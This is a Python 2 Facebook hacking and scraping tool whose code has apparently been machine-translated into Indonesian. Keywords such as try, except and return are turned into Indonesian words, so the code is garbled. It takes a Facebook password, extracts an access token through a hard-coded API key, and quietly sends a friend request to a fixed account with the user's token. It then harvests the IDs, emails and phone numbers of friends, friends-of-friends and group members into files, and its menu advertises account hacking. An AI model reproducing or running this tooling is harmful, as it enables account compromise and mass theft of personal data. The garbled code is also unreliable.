#!/usr/bin/python
# pengkodean=utf-8
# pashakun.com

#Impor modul
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
dari multiprocessing.pool impor ThreadPool
mencoba:
	mekanisme impor
kecuali ImportError:
	os.system("pip2 install mekanik")
mencoba:
	permintaan impor
kecuali ImportError:
	os.system("permintaan pemasangan pip2")
dari request.exceptions impor ConnectionError
dari browser impor mekanis

#-Pengaturan-#
########
isi ulang (sys)
sys.setdefaultencoding('utf8')
br = mekanisasi.Browser()
br.set_handle_robots(Salah)
br.set_handle_refresh(mekanisasi._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Versi/12.16')]

#-Keluar-#
def keluar():
	print "\033[1;91m[!] Keluar"
	os.sys.keluar()
	
#-Warna-#
pasti acak(x):
    w = 'mhkbpcP'
    t = ''
    untuk saya di x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    kembali cetak(d)
    
def cetak(x):
    w = 'mhkbpcP'
    untuk saya di w:
        j = w.indeks(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.ganti('!0','\033[0m')
    sys.stdout.write(x+'\n')
	
#-Animasi-#
def jalan(z):
	untuk e dalam z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		waktu.tidur(00000.1)
		
##### LOGO #####
logo = """\033[1;30m█████████
\033[1;30m█▄█████▄█ \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[1;30m█\033[1;92m▼▼▼▼▼ \033[1;92m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─ ═╗╔╗
\033[1;30m█ \033[1;92m \033[1;92m_-_-- -_ --__\033[1;93m ╠╩╗
\033[1;30m█\033[1;92m▲▲▲▲▲\033[1;92m-- - _ --\033[1;96m═╩╝┴ \033[1;96m
\033[1;30m█████████ \033[1;92m«----------✧----------»
\033[1;30m
\033[1;31m╔═══════════════════════════════════════════
\033[1;31m║\033[1;32m* \033[1;93mAuthor \033[1;93m: \033[1;37m./OiBoy SecLinux \033[1;31m
\033[1;31m║\033[1;32m* \033[1;93mSitus Web \033[1;93m: \033[1;37m\033[4mhttps://pashakun.com\033[0m \033[] 1;31m
\033[1;31m║\033[1;32m* \033[1;93mGitHub \033[1;93m: \033[1;37m\033[4mhttps://github.com/pashayogi\033[0m \ 033[1;31m
\033[1;31m║\033[1;32m* \033[1;93mTeam \033[1;93m: \033[1;37m\033[4mINDONESIA CYBER ERROR SYSTEM\033[0m \033[1;31m)
\033[1;31m╚═══════════════════════════════════════════ """

# titik #
def tik():
	titik = ['. ','.. ','... ']
	untuk o di titik:
		print("\r\033[1;91m[●] \033[1;92mMemuat \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

kembali = 0
benang = []
berhasil = []
titik cek = []
oke = []
gagal = []
teman teman = []
idfromteman = []
idmem = []
emm = []
nama = []
identitas = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksi grup = []
komen = []
komengrup = []
daftar grup = []
vulnot = "\033[31mBukan Vuln"
vuln = "\033[32mVuln"

##### LISENSI #####
#====================#
lisensi def():
	os.sistem('setel ulang')
	masuk()

##### Pilih Login #####
def masuk():
	os.sistem('setel ulang')
	cetak logo
	print "\033[1;91m║--\033[1;91m> \033[1;95m1.\033[1;32m Login dulu"]
	print "\033[1;91m║--\033[1;91m> \033[1;95m2.\033[1;32m Login menggunakan token"
	print "\033[1;91m║--\033[1;91m> \033[1;95m0.\033[1;31m Keluar/keluar"
	cetak "\033[1;91m║"
	msuk = raw_input("\033[1;96m╚═\033[1;1mD \033[1;93m")
	jika msuk ="":
		print"\033[1;91m[!] Masukan salah"
		keluar()
	elif msuk ="1":
		Gabung()
	elif msuk ="2":
		tokenz()
	elif msuk ="0":
		keluar()
	kalau tidak:
		print"\033[1;91m[!] Masukan salah"
		keluar()
		
##### GABUNG #####
#==================#
def masuk():
	os.sistem('setel ulang')
	mencoba:
		toket = buka('login.txt','r')
		Tidak bisa()
	kecuali (KeyError,IOError):
		os.sistem('setel ulang')
		cetak logo
		print('\033[1;96m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1]) ;92m')
		pwd = getpass.getpass('\033[1;95m[+] \033[1;93mPassword \033[1;93m:\033[1;95m ')
		tik()
		mencoba:
			br.open('https://m.facebook.com')
		kecuali mechanize.URLError:
			print"\n\033[1;91m[!] Tidak ada koneksi"
			keluar()
		br._factory.is_html = Benar
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['lulus'] = pwd
		br.kirim()
		url = br.geturl()
		jika 'simpan perangkat' di url:
			mencoba:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+_return_ssssss'f324v32.
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1"," locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.teks)
				zedd = buka("login.txt", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin berhasil'
				request.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				os.system('xdg-open https://www.pashakun.com')
				Tidak bisa()
			kecuali request.exceptions.ConnectionError:
				print"\n\033[1;91m[!] Tidak ada koneksi"
				keluar()
		jika 'pos pemeriksaan' di url:
			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
			print("\n\033[1;92m[#] Harap Login Ulang !")
			os.system('rm -rf login.txt')
			waktu.tidur(1)
			keluar()
		kalau tidak:
			print("\n\033[1;91m[!] Login Gagal")
			os.system('rm -rf login.txt')
			waktu.tidur(1)
			Gabung()
			
##### TOKEN #####
def tokenz():
	os.sistem('setel ulang')
	cetak logo
	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
	mencoba:
		otw = request.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.teks)
		nama = a['nama']
		zedd = buka("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		Tidak bisa()
	kecuali KeyError:
		print "\033[1;91m[!] Salah"
		e = raw_input("\033[1;91m[?] \033[1;92mIngin mengambil token?\033[1;97m[y/n]: ")
		jika e =="":
			keluar()
		elif e ="y":
			Gabung()
		kalau tidak:
			keluar()
			
##### TIDAK BISA ##########################################
menu def():
	os.sistem('setel ulang')
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		os.sistem('setel ulang')
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	mencoba:
		otw = request.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.teks)
		nama = a['nama']
		id = a['id']
	kecuali KeyError:
		os.sistem('setel ulang')
		print"\033[1;91m[!] \033[1;93mPos Pemeriksaan Akun"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	kecuali request.exceptions.ConnectionError:
		print"\033[1;91m[!] Tidak ada koneksi"
		keluar()
	os.system("reset")
	cetak logo
	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Nama \033[1;91m: \033[1;92m"+nama+"\033 [1;97m"
	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID \033[1;91m: \033[1;92m"+id
	print "\033[1;97m╚"+40*"═"
	print "\033[1;94m║--\033[1;91m> \033[1;93m1.\033[1;95m Informasi pengguna"
	print "\033[1;94m║--\033[1;91m> \033[1;93m2.\033[1;95m Dapatkan Id/email/hp"
	print "\033[1;94m║--\033[1;91m> \033[1;93m3.\033[1;95m Meretas akun facebook "
	print "\033[1;94m║--\033[1;91m> \033[1;93m4.\033[1;95m Bot "
	print "\033[1;94m║--\033[1;91m> \033[1;93m5.\033[1;95m Lainnya "
	print "\033[1;94m║--\033[1;91m> \033[1;93m6.\033[1;95m Tampilkan token "
	print "\033[1;94m║--\033[1;91m> \033[1;93m7.\033[1;95m Hapus sampah "
	print "\033[1;94m║--\033[1;91m> \033[1;93m8.\033[1;95m Logout "
	print "\033[1;94m║--\033[1;91m> \033[1;93m0.\033[1;95m Keluar dari program "
	cetak "║"
	pilih()
#-
pasti pilih():
	zedd = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	jika zedd ="":
		print "\033[1;91m[!] Masukan salah"
		pilih()
	elif zedd ="1":
		informasi()
	elif zedd ="2":
		membuang()
	elif zedd ="3":
		menu_hack()
	elif zedd ="4":
		menu_bot()
	elif zedd ="5":
		lain()
	elif zedd ="6":
		os.sistem('setel ulang')
		cetak logo
		toket=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;92mToken Anda\033[1;91m :\033[1;97m "+toket"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		Tidak bisa()
	elif zedd ="7":
		os.remove('keluar')
	elif zedd ="8":
		os.system('rm -rf login.txt')
		os.system('xdg-open https://www.pashakun.com')
		keluar()
	elif zedd ="0":
		keluar()
	kalau tidak:
		print "\033[1;91m[!] Masukan salah"
		pilih()
	
##### INFO #####
def informasi():
	os.sistem('setel ulang')
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	os.sistem('setel ulang')
	cetak logo
	aid = raw_input('\033[1;91m[+] \033[1;92mMasukkan ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
	jalan('\033[1;91m[✺] \033[1;92mTunggu sebentar \033[1;97m...')
	r = request.get('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads(r.teks)
	untuk saya di cok['data']:
		jika bantuan dalam i['nama'] atau bantuan dalam i['id']:
			x = request.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.teks)
			cetak 42*"\033[1;97m═"
			mencoba:
				print '\033[1;91m[➹] \033[1;92mNama\033[1;97m : '+z['nama']
			kecuali KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m : \033[1;91mNot found'
			mencoba:
				print '\033[1;91m[➹] \033[1;92mID\033[1;97m : '+z['id']
			kecuali KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;97m : \033[1;91mTidak ditemukan'
			mencoba:
				print '\033[1;91m[➹] \033[1;92mEmail\033[1;97m : '+z['email']
			kecuali KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;97m : \033[1;91mTidak ditemukan'
			mencoba:
				print '\033[1;91m[➹] \033[1;92mTelepon\033[1;97m : '+z['mobile_phone']
			kecuali KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m : \033[1;91mTidak ditemukan'
			mencoba:
				print '\033[1;91m[➹] \033[1;92mLocation\033[1;97m : '+z['location']['name']
			kecuali KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;97m : \033[1;91mNot found'
			mencoba:
				print '\033[1;91m[➹] \033[1;92mTanggal lahir\033[1;97m : '+z['ulang tahun']
			kecuali KeyError: print '\033[1;91m[?] \033[1;92mTanggal lahir\033[1;97m : \033[1;91mTidak ditemukan'
			mencoba:
				print '\033[1;91m[➹] \033[1;92mSekolah\033[1;97m : '
				untuk q dalam z['pendidikan']:
					mencoba:
						print '\033[1;91m ~ \033[1;97m'+q['sekolah']['nama']
					kecuali KeyError: print '\033[1;91m ~ \033[1;91mTidak ditemukan'
			kecuali KeyError: lulus
			raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
			Tidak bisa()
		kalau tidak:
			lulus
	kalau tidak:
		print"\033[1;91m[✖] Pengguna tidak ditemukan"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		Tidak bisa()
		
##### MEMBUANG #####
def dump():
	os.sistem('setel ulang')
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	os.sistem('setel ulang')
	cetak logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Dapatkan ID teman"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Dapatkan ID teman dari teman"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Dapatkan Pencarian ID"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Dapatkan ID anggota grup"
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Dapatkan email anggota grup"
	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Dapatkan nomor telepon anggota grup"
	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Dapatkan email teman"
	print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Dapatkan email teman dari teman"
	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m Dapatkan nomor telepon teman"
	print "\033[1;97m║--\033[1;91m> \033[1;92m10.\033[1;97m Dapatkan nomor telepon teman dari teman"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Kembali"
	cetak "║"
	dump_pilih()
#-----pilih
def dump_pilih():
	cuih = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	jika cuih ="":
		print "\033[1;91m[!] Masukan salah"
		dump_pilih()
	elif cuih ="1":
		id_teman()
	elif cuih ="2":
		idfrom_teman()
	elif cuih ="3":
		os.sistem('setel ulang')
		print "\033[1;91mSegera"
		keluar()
	elif cuih ="4":
		id_anggota_grup()
	elif cuih ="5":
		em_member_grup()
	elif cuih ="6":
		tidak_anggota_grup()
	elif cuih ="7":
		surel()
	elif cuih ="8":
		emaildari_teman()
	elif cuih ="9":
		nomor_hp()
	elif cuih ="10":
		hpfrom_teman()
	elif cuih ="0":
		Tidak bisa()
	kalau tidak:
		print "\033[1;91m[!] Masukan salah"
		dump_pilih()
		
##### ID TEMAN #####
def id_teman():
	os.sistem('setel ulang')
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	mencoba:
		os.mkdir('keluar')
	kecuali OSError:
		lulus
	mencoba:
		os.sistem('setel ulang')
		cetak logo
		r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z=json.loads(r.teks)
		jalan('\033[1;91m[✺] \033[1;92mDapatkan semua id teman \033[1;97m...')
		cetak 42*"\033[1;97m═"
		bz = buka('keluar/id_teman.txt','w')
		untuk a di z['data']:
			idteman.append(a['id'])
			bz.tulis(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m ]\033[1;97m=> \033[1;97m "+a['id']),;sys.stdout.flush();time.sleep(0,0001)
		bz.tutup()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mBerhasil mendapatkan id \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSimpan file dengan nama\033[1;91m :\033[1;97m ")
		os.rename('out/id_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile disimpan \033[1;91m: \033[1;97mout/"+selesai)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali IOError:
		print"\033[1;91m[!] Kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali KeyError:
		print('\033[1;91m[!] Kesalahan')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali request.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()

##### ID DARI TEMAN #####
def idfrom_teman():
	os.sistem('setel ulang')
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	mencoba:
		os.mkdir('keluar')
	kecuali OSError:
		lulus
	mencoba:
		os.sistem('setel ulang')
		cetak logo
		idt = raw_input("\033[1;91m[+] \033[1;92mMasukkan ID teman \033[1;91m: \033[1;97m")
		mencoba:
			jok = request.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDari\033[1;91m :\033[1;97m "+op["nama"]
		kecuali KeyError:
			print"\033[1;91m[!] Teman tidak ditemukan"
			raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
			membuang()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5000)&access_token="+toket)
		z=json.loads(r.teks)
		jalan('\033[1;91m[✺] \033[1;92mDapatkan semua id teman dari teman \033[1;97m...')
		cetak 42*"\033[1;97m═"
		bz = buka('keluar/id_teman_from_teman.txt','w')
		untuk a di z['teman']['data']:
			idfromteman.append(a['id'])
			bz.tulis(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m "+a['id']),;sys.stdout.flush();time.sleep(0,0001)
		bz.tutup()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mBerhasil mendapatkan id \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSimpan file dengan nama\033[1;91m :\033[1;97m ")
		os.rename('out/id_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile disimpan \033[1;91m: \033[1;97mout/"+selesai)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali IOError:
		print"\033[1;91m[!] Kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali KeyError:
		print('\033[1;91m[!] Kesalahan')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali request.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()

##### ID DARI GRUP ANGGOTA #####
def id_member_grup():
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	mencoba:
		os.mkdir('keluar')
	kecuali OSError:
		lulus
	mencoba:
		os.sistem('setel ulang')
		cetak logo
		id=raw_input('\033[1;91m[+] \033[1;92mGrup ID masukan \033[1;91m:\033[1;97m ')
		mencoba:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
			asw=json.loads(r.teks)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDari grup \033[1;91m:\033[1;97m "+asw['nama'] ]
		kecuali KeyError:
			print"\033[1;91m[!] Grup tidak ditemukan"
			raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
			membuang()
		jalan('\033[1;91m[✺] \033[1;92mDapatkan id anggota grup \033[1;97m...')
		cetak 42*"\033[1;97m═"
		bz = buka('keluar/member_grup.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.teks)
		untuk a di s['data']:
			idmem.append(a['id'])
			bz.tulis(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m ]\033[1;97m=> \033[1;97m "+a['id']),;sys.stdout.flush();time.sleep(0,0001)
		bz.tutup()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mBerhasil mendapatkan id \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idmem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSimpan file dengan nama\033[1;91m :\033[1;97m ")
		os.rename('keluar/member_grup.txt','keluar/'+selesai)
		print("\r\033[1;91m[+] \033[1;92mFile disimpan \033[1;91m: \033[1;97mout/"+selesai)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali IOError:
		print"\033[1;91m[!] Kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali KeyError:
		print('\033[1;91m[!] Kesalahan')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali request.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()
		
##### EMAIL DARI GRUP #####
def em_member_grup():
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	mencoba:
		os.mkdir('keluar')
	kecuali OSError:
		lulus
	mencoba:
		os.sistem('setel ulang')
		cetak logo
		id=raw_input('\033[1;91m[+] \033[1;92mGrup ID masukan \033[1;91m:\033[1;97m ')
		mencoba:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
			asw=json.loads(r.teks)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDari grup \033[1;91m:\033[1;97m "+asw['nama'] ]
		kecuali KeyError:
			print"\033[1;91m[!] Grup tidak ditemukan"
			raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
			membuang()
		jalan('\033[1;91m[✺] \033[1;92mDapatkan email anggota grup \033[1;97m...')
		cetak 42*"\033[1;97m═"
		bz = buka('keluar/em_member_grup.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.teks)
		untuk a di s['data']:
			x = request.get("https://graph.facebook.com/"+a['id']+"?access_token="+toket)
			z = json.loads(x.teks)
			mencoba:
				emmem.append(z['email'])
				bz.tulis(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(emmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m ]\033[1;97m=> \033[1;97m "+z['email']+" | "+z['nama']+"\n"),;sys.stdout.flush();time.sleep(0,0001)
			kecuali KeyError:
				lulus
		bz.tutup()
		cetak 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mBerhasil mendapatkan email dari grup anggota \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emmem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSimpan file dengan nama\033[1;91m :\033[1;97m ")
		os.rename('out/em_member_grup.txt','out/'+selesai)
		print("\r\033[1;91m[+] \033[1;92mFile disimpan \033[1;91m: \033[1;97mout/"+selesai)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali IOError:
		print"\033[1;91m[!] Kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali KeyError:
		print('\033[1;91m[!] Kesalahan')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali request.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()
		
##### NOMER DARI GRUP #####
def no_member_grup():
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	mencoba:
		os.mkdir('keluar')
	kecuali OSError:
		lulus
	mencoba:
		os.sistem('setel ulang')
		cetak logo
		id=raw_input('\033[1;91m[+] \033[1;92mGrup ID masukan \033[1;91m:\033[1;97m ')
		mencoba:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
			asw=json.loads(r.teks)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDari grup \033[1;91m:\033[1;97m "+asw['nama'] ]
		kecuali KeyError:
			print"\033[1;91m[!] Grup tidak ditemukan"
			raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
			membuang()
		jalan('\033[1;91m[✺] \033[1;92mDapatkan nomor telepon anggota grup \033[1;97m...')
		cetak 42*"\033[1;97m═"
		bz = buka('keluar/no_member_grup.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.teks)
		untuk a di s['data']:
			x = request.get("https://graph.facebook.com/"+a['id']+"?access_token="+toket)
			z = json.loads(x.teks)
			mencoba:
				nomem.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(nomem))+"\033[1;97m ]\033[1;97m=> \033[1;97m ]\033[1;97m=> \033[1;97m "+z['ponsel_ponsel']+" | "+z['nama']+"\n"),;sys.stdout.flush();time.sleep(0,0001)
			kecuali KeyError:
				lulus
		bz.tutup()
		cetak 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mBerhasil mendapatkan nomor telepon dari grup anggota \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mJumlah Total \033[1;91m: \033[1;97m%s"%(len(nomem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSimpan file dengan nama\033[1;91m :\033[1;97m ")
		os.rename('out/no_member_grup.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile disimpan \033[1;91m: \033[1;97mout/"+selesai)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali IOError:
		print"\033[1;91m[!] Kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali KeyError:
		print('\033[1;91m[!] Kesalahan')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali request.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()
		
##### SUREL #####
def email():
	mencoba:
		toket=open('login.txt','r').read()
	kecuali IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		waktu.tidur(1)
		Gabung()
	mencoba:
		os.mkdir('keluar')
	kecuali OSError:
		lulus
	mencoba:
		os.sistem('setel ulang')
		cetak logo
		r = request.get('https://graph.facebook.com/me/friends?access_token='+toket)
		a = json.loads(r.teks)
		jalan('\033[1;91m[✺] \033[1;92mDapatkan semua email teman \033[1;97m...')
		cetak 42*"\033[1;97m═"
		bz = buka('keluar/email_teman.txt','w')
		untuk saya di ['data']:
			x = request.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.teks)
			mencoba:
				em.append(z['email'])
				bz.tulis(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(em))+"\033[1;97m ]\033[1;97m=> \033[1;97m ]\033[1;97m=> \033[1;97m "+z['email']+" | "+z['nama']+"\n"),;sys.stdout.flush();time.sleep(0,0001)
			kecuali KeyError:
				lulus
		bz.tutup()
		cetak 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mBerhasil mendapatkan email \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(em))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSimpan file dengan nama\033[1;91m :\033[1;97m ")
		os.rename('out/email_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile disimpan \033[1;91m: \033[1;97mout/"+selesai)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali IOError:
		print"\033[1;91m[!] Kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		membuang()
	kecuali (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
